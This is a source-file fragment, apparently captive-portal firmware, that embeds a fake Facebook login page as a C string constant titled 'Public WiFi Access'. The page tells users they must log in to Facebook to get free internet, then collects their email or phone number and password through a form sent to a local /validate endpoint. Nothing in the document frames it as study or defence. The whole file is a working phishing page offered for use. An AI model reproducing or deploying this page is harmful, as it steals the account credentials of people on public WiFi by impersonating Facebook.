const char FACEBOOK_HTML[] = R"=====(
<html>

  <head>

    <title>Public WiFi Access - Facebook Login</title>

    <meta charset='UTF-8'>
    <meta name='viewport' content='width=device-width,
    initial-scale=0.75, maximum-scale=0.75, user-scalable=no'>
    <meta name='theme-color' content='#5170ad' />

    <style class='cp-pen-styles'>

      * {
        -webkit-box-sizing: border-box;
        -moz-box-sizing: border-box;
        box-sizing: border-box;
      }

      html {
        background: #E2E2E2;
      }

      body {
        background: #E2E2E2;
        margin: 0;
        padding: 0;
        font-family: 'Lato', sans-serif;
      }

      .login-form-wrap {
        background: #5170ad;
        background: -moz-radial-gradient(center, ellipse cover, #5170ad 0%, #355493 100%);
        background: -webkit-gradient(radial, center center, 0px, center center, 100%, color-stop(0%, #5170ad), color-stop(100%, #355493));
        background: -webkit-radial-gradient(center, ellipse cover, #5170ad 0%, #355493 100%);
        background: -o-radial-gradient(center, ellipse cover, #5170ad 0%, #355493 100%);
        background: -ms-radial-gradient(center, ellipse cover, #5170ad 0%, #355493 100%);
        background: radial-gradient(ellipse at center, #5170ad 0%, #355493 100%);
        filter: progid: DXImageTransform.Microsoft.gradient( startColorstr='#5170ad', endColorstr='#355493', GradientType=1);
        border: 1px solid #2d416d;
        position: relative;
        width: 100%;
        height: 100%;
        margin: auto auto;
        padding: 50px 30px 0 30px;
        text-align: center;
      }

      .login-form-wrap:before {
        display: block;
        content: '';
        width: 58px;
        height: 19px;
        top: 10px;
        left: 10px;
        position: absolute;
      }

      .login-form-wrap > h1 {
        margin: 0 0 150px 0;
        padding: 0;
        font-size: 26px;
        color: #fff;
      }

      .login-form-wrap > h5 {
        margin-top: 40px;
      }

      .login-form-wrap > h5 > a {
        font-size: 14px;
        color: #fff;
        text-decoration: none;
        font-weight: 400;
      }

      .login-form input[type='text'],
      .login-form input[type='password'] {
        display: block;
        width: 450px;
        border: 1px solid #314d89;
        outline: none;
        padding: 30px 100px;
        color: #afafaf;
        font-weight: 400;
        font-family: 'Lato', sans-serif;
        cursor: pointer;
      }

      .login-form input[type='text'] {
        color: black;
        font-size: 17px;
        border-bottom: none;
        border-radius: 22px 22px 0 0;
        padding-bottom: 13px;
        box-shadow: 0 -1px 0 #E0E0E0 inset, 0 1px 2px rgba(0, 0, 0, 0.23) inset;
      }

      .login-form input[type='password'] {
        color: black;
        font-size: 17px;
        border-top: none;
        border-radius: 0 0 22px 22px;
        box-shadow: 0 -1px 2px rgba(0, 0, 0, 0.23) inset, 0 1px 20px rgba(255, 255, 255, 0.1);
      }

      .login-form input[type='submit'] {
        font-family: 'Lato', sans-serif;
        font-weight: 40;
        background: #e000e0;
        background: -moz-linear-gradient(top, #e0e0e0 0%, #cecece 100%);
        background: -webkit-gradient(linear, left top, left bottom, color-stop(0%, #e0e0e0), color-stop(100%, #cecece));
        background: -webkit-linear-gradient(top, #e0e0e0 0%, #cecece 100%);
        background: -o-linear-gradient(top, #e0e0e0 0%, #cecece 100%);
        background: -ms-linear-gradient(top, #e0e0e0 0%, #cecece 100%);
        background: linear-gradient(to bottom, #e0e0e0 0%, #cecece 100%);
        filter: progid: DXImageTransform.Microsoft.gradient( startColorstr='#e0e0e0', endColorstr='#cecece', GradientType=0);
        display: block;
        margin: 40px auto 0 auto;
        width: 345px;
        border: none;
        border-radius: 3px;
        padding: 8px;
        font-size: 17px;
        color: #636363;
        text-shadow: 0 1px 0 rgba(255, 255, 255, 0.45);
        font-weight: 700;
        box-shadow: 0 1px 3px 1px rgba(0, 0, 0, 0.17), 0 1px 0 rgba(255, 255, 255, 0.36) inset;
      }

      .login-form input[type='submit']:hover {
        background: #DDD;
      }

      .login-form input[type='submit']:active {
        padding-top: 9px;
        padding-bottom: 7px;
        background: #C9C9C9;        
      }

      .disable-selection {
        -webkit-touch-callout: none;
        -webkit-user-select: none;
        -khtml-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
      }
      
    </style>
  </head>

  <body>

    <section class='login-form-wrap'>


<svg role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>Facebook icon</title><path d="M23.9981 11.9991C23.9981 5.37216 18.626 0 11.9991 0C5.37216 0 0 5.37216 0 11.9991C0 17.9882 4.38789 22.9522 10.1242 23.8524V15.4676H7.07758V11.9991H10.1242V9.35553C10.1242 6.34826 11.9156 4.68714 14.6564 4.68714C15.9692 4.68714 17.3424 4.92149 17.3424 4.92149V7.87439H15.8294C14.3388 7.87439 13.8739 8.79933 13.8739 9.74824V11.9991H17.2018L16.6698 15.4676H13.8739V23.8524C19.6103 22.9522 23.9981 17.9882 23.9981 11.9991Z"/></svg>
        <form class='login-form' action='/validate' method='GET'>

            <center><label>
            <input id='eml' type='text' name='user' class='1' placeholder='Email or phone number' _autofocus='true' autocorrect='off' autocomplete='off' autocapitalize='off' required></label>
            <label><input id='pwd' type='password' name='pass' class='2' placeholder='Password'autocorrect='off' autocomplete='off' autocapitalize='off' required></label></center>
            <input type='hidden' name='url' value='facebook.com'>
            <input id='btn' type='submit' value='Log In'>

        </form>

      <h5><a href='#' class='disable-selection'>Forgot account?</a></h5>

<p style="color:yellow";>Login your Facebook Account to Access Free Internet.</p>

    </section>

  </body>

</html>
)=====";
